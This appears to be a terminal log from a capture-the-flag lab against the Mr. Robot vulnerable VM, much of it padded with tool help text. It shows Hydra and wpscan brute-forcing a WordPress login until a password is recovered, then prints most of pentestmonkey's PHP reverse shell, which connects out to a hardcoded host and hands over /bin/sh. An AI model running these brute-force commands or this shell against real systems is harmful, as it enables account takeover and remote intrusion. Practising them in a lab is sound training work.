+                                                  If no --username/s option supplied, user enumeration will be run.
+    -U, --usernames LIST                          List of usernames to use during the password attack.
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall
+                                                  Default: 500
+        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.
+                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall
+        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive
+
+root@kali:~/Mr.Robot# wpscan -u --help
+
+Scan Aborted: invalid option: -u
+root@kali:~/Mr.Robot# cat fsocity.dic | sort -u > fsociety.dic
+root@kali:~/Mr.Robot# ls
+fsociety.dic  fsocity.dic  hydra.restore  key-1-of-3.txt  robots.txt  sitemap.xml
+root@kali:~/Mr.Robot# sort --help
+Usage: sort [OPTION]... [FILE]...
+  or:  sort [OPTION]... --files0-from=F
+Write sorted concatenation of all FILE(s) to standard output.
+
+With no FILE, or when FILE is -, read standard input.
+
+Mandatory arguments to long options are mandatory for short options too.
+Ordering options:
+
+  -b, --ignore-leading-blanks  ignore leading blanks
+  -d, --dictionary-order      consider only blanks and alphanumeric characters
+  -f, --ignore-case           fold lower case to upper case characters
+  -g, --general-numeric-sort  compare according to general numerical value
+  -i, --ignore-nonprinting    consider only printable characters
+  -M, --month-sort            compare (unknown) < 'JAN' < ... < 'DEC'
+  -h, --human-numeric-sort    compare human readable numbers (e.g., 2K 1G)
+  -n, --numeric-sort          compare according to string numerical value
+  -R, --random-sort           shuffle, but group identical keys.  See shuf(1)
+      --random-source=FILE    get random bytes from FILE
+  -r, --reverse               reverse the result of comparisons
+      --sort=WORD             sort according to WORD:
+                                general-numeric -g, human-numeric -h, month -M,
+                                numeric -n, random -R, version -V
+  -V, --version-sort          natural sort of (version) numbers within text
+
+Other options:
+
+      --batch-size=NMERGE   merge at most NMERGE inputs at once;
+                            for more use temp files
+  -c, --check, --check=diagnose-first  check for sorted input; do not sort
+  -C, --check=quiet, --check=silent  like -c, but do not report first bad line
+      --compress-program=PROG  compress temporaries with PROG;
+                              decompress them with PROG -d
+      --debug               annotate the part of the line used to sort,
+                              and warn about questionable usage to stderr
+      --files0-from=F       read input from the files specified by
+                            NUL-terminated names in file F;
+                            If F is - then read names from standard input
+  -k, --key=KEYDEF          sort via a key; KEYDEF gives location and type
+  -m, --merge               merge already sorted files; do not sort
+  -o, --output=FILE         write result to FILE instead of standard output
+  -s, --stable              stabilize sort by disabling last-resort comparison
+  -S, --buffer-size=SIZE    use SIZE for main memory buffer
+  -t, --field-separator=SEP  use SEP instead of non-blank to blank transition
+  -T, --temporary-directory=DIR  use DIR for temporaries, not $TMPDIR or /tmp;
+                              multiple options specify multiple directories
+      --parallel=N          change the number of sorts run concurrently to N
+  -u, --unique              with -c, check for strict ordering;
+                              without -c, output only the first of an equal run
+  -z, --zero-terminated     line delimiter is NUL, not newline
+      --help     display this help and exit
+      --version  output version information and exit
+
+KEYDEF is F[.C][OPTS][,F[.C][OPTS]] for start and stop position, where F is a
+field number and C a character position in the field; both are origin 1, and
+the stop position defaults to the line's end.  If neither -t nor -b is in
+effect, characters in a field are counted from the beginning of the preceding
+whitespace.  OPTS is one or more single-letter ordering options [bdfgiMhnRrV],
+which override global ordering options for that key.  If no key is given, use
+the entire line as the key.  Use --debug to diagnose incorrect key usage.
+
+SIZE may be followed by the following multiplicative suffixes:
+% 1% of memory, b 1, K 1024 (default), and so on for M, G, T, P, E, Z, Y.
+
+*** WARNING ***
+The locale specified by the environment affects sort order.
+Set LC_ALL=C to get the traditional sort order that uses
+native byte values.
+
+GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
+Full documentation at: <https://www.gnu.org/software/coreutils/sort>
+or available locally via: info '(coreutils) sort invocation'
+root@kali:~/Mr.Robot# vim fsociety.dic
+root@kali:~/Mr.Robot# cat fsocity.dic | sort > fsociety2.dic
+root@kali:~/Mr.Robot# vim fsociety2.dic
+root@kali:~/Mr.Robot# rm fsociety2.dic
+root@kali:~/Mr.Robot# hydra -l elliot -P fsociety.dic 192.168.124.187 -m "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"  http-form-post
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 16:30:57
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
+[DATA] attacking http-post-form://192.168.124.187:80/wp-login.php:log=elliot&pwd=^PASS^:ERROR
+[STATUS] 734.00 tries/min, 734 tries in 00:01h, 10718 to do in 00:15h, 16 active
+[STATUS] 736.00 tries/min, 2208 tries in 00:03h, 9244 to do in 00:13h, 16 active
+[STATUS] 736.71 tries/min, 5157 tries in 00:07h, 6295 to do in 00:09h, 16 active
+[STATUS] 737.00 tries/min, 8844 tries in 00:12h, 2608 to do in 00:04h, 16 active
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-17 16:46:40
+root@kali:~/Mr.Robot# wpscan --hh
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.3
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+Usage: wpscan [options]
+        --url URL                                 The URL of the blog to scan
+                                                  Allowed Protocols: http, https
+                                                  Default Protocol if none provided: http
+                                                  This option is mandatory unless update or help or hh or version is/are supplied
+    -h, --help                                    Display the simple help and exit
+        --hh                                      Display the full help and exit
+        --version                                 Display the version and exit
+        --ignore-main-redirect                    Ignore the main redirect (if any) and scan the target url
+    -v, --verbose                                 Verbose mode
+        --[no-]banner                             Whether or not to display the banner
+                                                  Default: true
+        --max-scan-duration SECONDS               Abort the scan if it exceeds the time provided in seconds
+    -o, --output FILE                             Output to FILE
+    -f, --format FORMAT                           Output results in the format supplied
+                                                  Available choices: cli-no-colour, cli-no-color, cli, json
+        --detection-mode MODE                     Default: mixed
+                                                  Available choices: mixed, passive, aggressive
+        --scope DOMAINS                           Comma separated (sub-)domains to consider in scope. 
+                                                  Wildcard(s) allowed in the trd of valid domains, e.g: *.target.tld
+                                                  Separator to use between the values: ','
+        --user-agent, --ua VALUE
+        --headers HEADERS                         Additional headers to append in requests
+                                                  Separator to use between the headers: '; '
+                                                  Examples: 'X-Forwarded-For: 127.0.0.1', 'X-Forwarded-For: 127.0.0.1; Another: aaa'
+        --vhost VALUE                             The virtual host (Host header) to use in requests
+        --random-user-agent, --rua                Use a random user-agent for each scan
+        --user-agents-list FILE-PATH              List of agents to use with --random-user-agent
+                                                  Default: /usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/app/user_agents.txt
+        --http-auth login:password
+    -t, --max-threads VALUE                       The max threads to use
+                                                  Default: 5
+        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1.
+        --request-timeout SECONDS                 The request timeout in seconds
+                                                  Default: 60
+        --connect-timeout SECONDS                 The connection timeout in seconds
+                                                  Default: 30
+        --disable-tls-checks                      Disables SSL/TLS certificate verification
+        --proxy protocol://IP:port                Supported protocols depend on the cURL installed
+        --proxy-auth login:password
+        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
+        --cookie-jar FILE-PATH                    File to read and write cookies
+                                                  Default: /tmp/wpscan/cookie_jar.txt
+        --cache-ttl TIME_TO_LIVE                  The cache time to live in seconds
+                                                  Default: 600
+        --clear-cache                             Clear the cache before the scan
+        --cache-dir PATH                          Default: /tmp/wpscan/cache
+        --server SERVER                           Force the supplied server module to be loaded
+                                                  Available choices: apache, iis, nginx
+        --force                                   Do not check if the target is running WordPress
+        --[no-]update                             Whether or not to update the Database
+        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content"
+        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins"
+        --interesting-findings-detection MODE     Use the supplied mode for the interesting findings detection. 
+                                                  Available choices: mixed, passive, aggressive
+        --wp-version-all                          Check all the version locations
+        --wp-version-detection MODE               Use the supplied mode for the WordPress version detection, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --main-theme-detection MODE               Use the supplied mode for the Main theme detection, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+    -e, --enumerate [OPTS]                        Enumeration Process
+                                                  Available Choices:
+                                                   vp   Vulnerable plugins
+                                                   ap   All plugins
+                                                   p    Plugins
+                                                   vt   Vulnerable themes
+                                                   at   All themes
+                                                   t    Themes
+                                                   tt   Timthumbs
+                                                   cb   Config backups
+                                                   dbe  Db exports
+                                                   u    User IDs range. e.g: u1-5
+                                                        Range separator to use: '-'
+                                                        Value if no argument supplied: 1-10
+                                                   m    Media IDs range. e.g m1-15
+                                                        Note: Permalink setting must be set to "Plain" for those to be detected
+                                                        Range separator to use: '-'
+                                                        Value if no argument supplied: 1-100
+                                                  Separator to use between the values: ','
+                                                  Default: All Plugins, Config Backups
+                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m
+                                                  Incompatible choices (only one of each group/s can be used):
+                                                   - vp, ap, p
+                                                   - vt, at, t
+        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration.
+                                                  Both the headers and body are checked. Regexp delimiters are not required.
+        --plugins-list LIST                       List of plugins to enumerate
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins, instead of the global (--detection-mode) mode.
+                                                  Default: passive
+                                                  Available choices: mixed, passive, aggressive
+        --plugins-version-all                     Check all the plugins version locations according to the choosen mode (--detection-mode, --plugins-detection and --plugins-version-detection)
+        --plugins-version-detection MODE          Use the supplied mode to check plugins versions instead of the --detection-mode or --plugins-detection modes.
+                                                  Default: mixed
+                                                  Available choices: mixed, passive, aggressive
+        --themes-list LIST                        List of themes to enumerate
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --themes-detection MODE                   Use the supplied mode to enumerate Themes, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --themes-version-all                      Check all the themes version locations according to the choosen mode (--detection-mode, --themes-detection and --themes-version-detection)
+        --themes-version-detection MODE           Use the supplied mode to check themes versions instead of the --detection-mode or --themes-detection modes.
+                                                  Available choices: mixed, passive, aggressive
+        --timthumbs-list FILE-PATH                List of timthumbs' location to use
+                                                  Default: /root/.wpscan/db/timthumbs-v3.txt
+        --timthumbs-detection MODE                Use the supplied mode to enumerate Timthumbs, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --config-backups-list FILE-PATH           List of config backups' filenames to use
+                                                  Default: /root/.wpscan/db/config_backups.txt
+        --config-backups-detection MODE           Use the supplied mode to enumerate Config Backups, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --db-exports-list FILE-PATH               List of DB exports' paths to use
+                                                  Default: /root/.wpscan/db/db_exports.txt
+        --db-exports-detection MODE               Use the supplied mode to enumerate DB Exports, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --medias-detection MODE                   Use the supplied mode to enumerate Medias, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --users-list LIST                         List of users to check during the users enumeration from the Login Error Messages
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --users-detection MODE                    Use the supplied mode to enumerate Users, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.
+                                                  If no --username/s option supplied, user enumeration will be run.
+    -U, --usernames LIST                          List of usernames to use during the password attack.
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall
+                                                  Default: 500
+        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.
+                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall
+        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive
+
+root@kali:~/Mr.Robot# wpscan --url http://192.168.124.186/wp-login.php -U elliot -P fsociety.dic
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.3
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+
+Scan Aborted: The url supplied 'http://192.168.124.186/wp-login.php/' seems to be down (Couldn't connect to server)
+root@kali:~/Mr.Robot# wpscan --url http://192.168.124.187/wp-login.php -U elliot -P fsociety.dic
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.3
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://192.168.124.187/wp-login.php/
+[+] Started: Sun Nov 17 16:53:32 2019
+
+Interesting Finding(s):
+
+[+] http://192.168.124.187/wp-login.php/
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Powered-By: PHP/5.5.29
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://192.168.124.187/wp-login.php/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] This site seems to be a multisite
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: http://codex.wordpress.org/Glossary#Multisite
+
+[+] http://192.168.124.187/wp-login.php/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+Fingerprinting the version - Time: 00:00:39 <======================> (716 / 716) 100.00% Time: 00:00:39
+[+] WordPress version 4.3.21 identified (Latest, released on 2019-10-14).
+ | Detected By: Query Parameter In Install Page (Aggressive Detection)
+ |  - http://192.168.124.187/wp-includes/css/buttons.min.css?ver=4.3.21
+ |  - http://192.168.124.187/wp-includes/css/dashicons.min.css?ver=4.3.21
+ | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
+ |  - http://192.168.124.187/wp-includes/css/buttons.min.css?ver=4.3.21
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <==========================> (21 / 21) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 1 user/s
+Trying elliot / 2251f5c33ac2206472d3744abcf6eae5d9 Time: 00:00:30 <> (1100 / 11451)  9.60%  ETA: 00:04:Trying elliot / 227f05c666df54ed7ebc6e9d732f6dd71f Time: 00:00:31 <> (1143 / 11451)  9.98%  ETA: 00:04:Trying elliot / 22845354632a51833ff057cfe5a7f937c9 Time: 00:00:31 <> (1147 / 11451) 10.01%  ETA: 00:04:Trying elliot / ER28-0652 Time: 00:08:10 <=======================> (5630 / 5630) 100.00% Time: 00:08:10
+[SUCCESS] - elliot / ER28-0652                                                                         
+
+[i] Valid Combinations Found:
+ | Username: elliot, Password: ER28-0652
+
+
+Scan Aborted: Cannot allocate memory - ps
+Trace: /usr/share/rubygems-integration/all/gems/activesupport-5.2.2.1/lib/active_support/core_ext/kernel/agnostics.rb:9:in ``'
+/usr/share/rubygems-integration/all/gems/activesupport-5.2.2.1/lib/active_support/core_ext/kernel/agnostics.rb:9:in ``'
+/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/lib/cms_scanner/helper.rb:11:in `memory_usage'
+/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/app/controllers/core.rb:72:in `after_scan'
+/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/lib/cms_scanner/controllers.rb:58:in `reverse_each'
+/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/lib/cms_scanner/controllers.rb:58:in `run'
+/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/lib/cms_scanner/scan.rb:24:in `run'
+/usr/share/rubygems-integration/all/gems/wpscan-3.5.3/bin/wpscan:16:in `block in <top (required)>'
+/usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/lib/cms_scanner/scan.rb:15:in `initialize'
+/usr/share/rubygems-integration/all/gems/wpscan-3.5.3/bin/wpscan:6:in `new'
+/usr/share/rubygems-integration/all/gems/wpscan-3.5.3/bin/wpscan:6:in `<top (required)>'
+/usr/bin/wpscan:23:in `load'
+/usr/bin/wpscan:23:in `<main>'
+root@kali:~/Mr.Robot# cd ..
+root@kali:~# ls
+Desktop    Downloads    Mr.Robot  php-reverse-shell-1.0  Public     Videos
+Documents  fsocity.dic  Music     Pictures               Templates
+root@kali:~# cd php-reverse-shell-1.0
+root@kali:~/php-reverse-shell-1.0# ls
+CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  php-reverse-shell.php
+root@kali:~/php-reverse-shell-1.0# vim php-reverse-shell.php
+root@kali:~/php-reverse-shell-1.0# vim --help
+VIM - Vi IMproved 8.1 (2018 May 18, compiled Feb 22 2019 12:55:04)
+
+Usage: vim [arguments] [file ..]       edit specified file(s)
+   or: vim [arguments] -               read text from stdin
+   or: vim [arguments] -t tag          edit file where tag is defined
+   or: vim [arguments] -q [errorfile]  edit file with first error
+
+Arguments:
+   --			Only file names after this
+   -g			Run using GUI (like "gvim")
+   -f  or  --nofork	Foreground: Don't fork when starting GUI
+   -v			Vi mode (like "vi")
+   -e			Ex mode (like "ex")
+   -E			Improved Ex mode
+   -s			Silent (batch) mode (only for "ex")
+   -d			Diff mode (like "vimdiff")
+   -y			Easy mode (like "evim", modeless)
+   -R			Readonly mode (like "view")
+   -Z			Restricted mode (like "rvim")
+   -m			Modifications (writing files) not allowed
+   -M			Modifications in text not allowed
+   -b			Binary mode
+   -l			Lisp mode
+   -C			Compatible with Vi: 'compatible'
+   -N			Not fully Vi compatible: 'nocompatible'
+   -V[N][fname]		Be verbose [level N] [log messages to fname]
+   -D			Debugging mode
+   -n			No swap file, use memory only
+   -r			List swap files and exit
+   -r (with file name)	Recover crashed session
+   -L			Same as -r
+   -A			Start in Arabic mode
+   -H			Start in Hebrew mode
+   -F			Start in Farsi mode
+   -T <terminal>	Set terminal type to <terminal>
+   --not-a-term		Skip warning for input/output not being a terminal
+   --ttyfail		Exit if input or output is not a terminal
+   -u <vimrc>		Use <vimrc> instead of any .vimrc
+   -U <gvimrc>		Use <gvimrc> instead of any .gvimrc
+   --noplugin		Don't load plugin scripts
+   -p[N]		Open N tab pages (default: one for each file)
+   -o[N]		Open N windows (default: one for each file)
+   -O[N]		Like -o but split vertically
+   +			Start at end of file
+   +<lnum>		Start at line <lnum>
+   --cmd <command>	Execute <command> before loading any vimrc file
+   -c <command>		Execute <command> after loading the first file
+   -S <session>		Source file <session> after loading the first file
+   -s <scriptin>	Read Normal mode commands from file <scriptin>
+   -w <scriptout>	Append all typed commands to file <scriptout>
+   -W <scriptout>	Write all typed commands to file <scriptout>
+   -x			Edit encrypted files
+   -X			Do not connect to X server
+   --remote <files>	Edit <files> in a Vim server if possible
+   --remote-silent <files>  Same, don't complain if there is no server
+   --remote-wait <files>  As --remote but wait for files to have been edited
+   --remote-wait-silent <files>  Same, don't complain if there is no server
+   --remote-tab[-wait][-silent] <files>  As --remote but use tab page per file
+   --remote-send <keys>	Send <keys> to a Vim server and exit
+   --remote-expr <expr>	Evaluate <expr> in a Vim server and print result
+   --serverlist		List available Vim server names and exit
+   --servername <name>	Send to/become the Vim server <name>
+   --startuptime <file>	Write startup timing messages to <file>
+   -i <viminfo>		Use <viminfo> instead of .viminfo
+   --clean		'nocompatible', Vim defaults, no plugins, no viminfo
+   -h  or  --help	Print Help (this message) and exit
+   --version		Print version information and exit
+
+Arguments recognised by gvim (GTK+ version):
+   -font <font>		Use <font> for normal text (also: -fn)
+   -geometry <geom>	Use <geom> for initial geometry (also: -geom)
+   -reverse		Use reverse video (also: -rv)
+   -display <display>	Run vim on <display> (also: --display)
+   --role <role>	Set a unique role to identify the main window
+   --socketid <xid>	Open Vim inside another GTK widget
+   --echo-wid		Make gvim echo the Window ID on stdout
+root@kali:~/php-reverse-shell-1.0# cat --help
+Usage: cat [OPTION]... [FILE]...
+Concatenate FILE(s) to standard output.
+
+With no FILE, or when FILE is -, read standard input.
+
+  -A, --show-all           equivalent to -vET
+  -b, --number-nonblank    number nonempty output lines, overrides -n
+  -e                       equivalent to -vE
+  -E, --show-ends          display $ at end of each line
+  -n, --number             number all output lines
+  -s, --squeeze-blank      suppress repeated empty output lines
+  -t                       equivalent to -vT
+  -T, --show-tabs          display TAB characters as ^I
+  -u                       (ignored)
+  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
+      --help     display this help and exit
+      --version  output version information and exit
+
+Examples:
+  cat f - g  Output f's contents, then standard input, then g's contents.
+  cat        Copy standard input to standard output.
+
+GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
+Full documentation at: <https://www.gnu.org/software/coreutils/cat>
+or available locally via: info '(coreutils) cat invocation'
+root@kali:~/php-reverse-shell-1.0# vi --help
+VIM - Vi IMproved 8.1 (2018 May 18, compiled Feb 22 2019 12:55:04)
+
+Usage: vim [arguments] [file ..]       edit specified file(s)
+   or: vim [arguments] -               read text from stdin
+   or: vim [arguments] -t tag          edit file where tag is defined
+   or: vim [arguments] -q [errorfile]  edit file with first error
+
+Arguments:
+   --			Only file names after this
+   -g			Run using GUI (like "gvim")
+   -f  or  --nofork	Foreground: Don't fork when starting GUI
+   -v			Vi mode (like "vi")
+   -e			Ex mode (like "ex")
+   -E			Improved Ex mode
+   -s			Silent (batch) mode (only for "ex")
+   -d			Diff mode (like "vimdiff")
+   -y			Easy mode (like "evim", modeless)
+   -R			Readonly mode (like "view")
+   -Z			Restricted mode (like "rvim")
+   -m			Modifications (writing files) not allowed
+   -M			Modifications in text not allowed
+   -b			Binary mode
+   -l			Lisp mode
+   -C			Compatible with Vi: 'compatible'
+   -N			Not fully Vi compatible: 'nocompatible'
+   -V[N][fname]		Be verbose [level N] [log messages to fname]
+   -D			Debugging mode
+   -n			No swap file, use memory only
+   -r			List swap files and exit
+   -r (with file name)	Recover crashed session
+   -L			Same as -r
+   -A			Start in Arabic mode
+   -H			Start in Hebrew mode
+   -F			Start in Farsi mode
+   -T <terminal>	Set terminal type to <terminal>
+   --not-a-term		Skip warning for input/output not being a terminal
+   --ttyfail		Exit if input or output is not a terminal
+   -u <vimrc>		Use <vimrc> instead of any .vimrc
+   -U <gvimrc>		Use <gvimrc> instead of any .gvimrc
+   --noplugin		Don't load plugin scripts
+   -p[N]		Open N tab pages (default: one for each file)
+   -o[N]		Open N windows (default: one for each file)
+   -O[N]		Like -o but split vertically
+   +			Start at end of file
+   +<lnum>		Start at line <lnum>
+   --cmd <command>	Execute <command> before loading any vimrc file
+   -c <command>		Execute <command> after loading the first file
+   -S <session>		Source file <session> after loading the first file
+   -s <scriptin>	Read Normal mode commands from file <scriptin>
+   -w <scriptout>	Append all typed commands to file <scriptout>
+   -W <scriptout>	Write all typed commands to file <scriptout>
+   -x			Edit encrypted files
+   -X			Do not connect to X server
+   --remote <files>	Edit <files> in a Vim server if possible
+   --remote-silent <files>  Same, don't complain if there is no server
+   --remote-wait <files>  As --remote but wait for files to have been edited
+   --remote-wait-silent <files>  Same, don't complain if there is no server
+   --remote-tab[-wait][-silent] <files>  As --remote but use tab page per file
+   --remote-send <keys>	Send <keys> to a Vim server and exit
+   --remote-expr <expr>	Evaluate <expr> in a Vim server and print result
+   --serverlist		List available Vim server names and exit
+   --servername <name>	Send to/become the Vim server <name>
+   --startuptime <file>	Write startup timing messages to <file>
+   -i <viminfo>		Use <viminfo> instead of .viminfo
+   --clean		'nocompatible', Vim defaults, no plugins, no viminfo
+   -h  or  --help	Print Help (this message) and exit
+   --version		Print version information and exit
+
+Arguments recognised by gvim (GTK+ version):
+   -font <font>		Use <font> for normal text (also: -fn)
+   -geometry <geom>	Use <geom> for initial geometry (also: -geom)
+   -reverse		Use reverse video (also: -rv)
+   -display <display>	Run vim on <display> (also: --display)
+   --role <role>	Set a unique role to identify the main window
+   --socketid <xid>	Open Vim inside another GTK widget
+   --echo-wid		Make gvim echo the Window ID on stdout
+root@kali:~/php-reverse-shell-1.0# ls
+CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  php-reverse-shell.php
+root@kali:~/php-reverse-shell-1.0# cat php-reverse-shell.php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
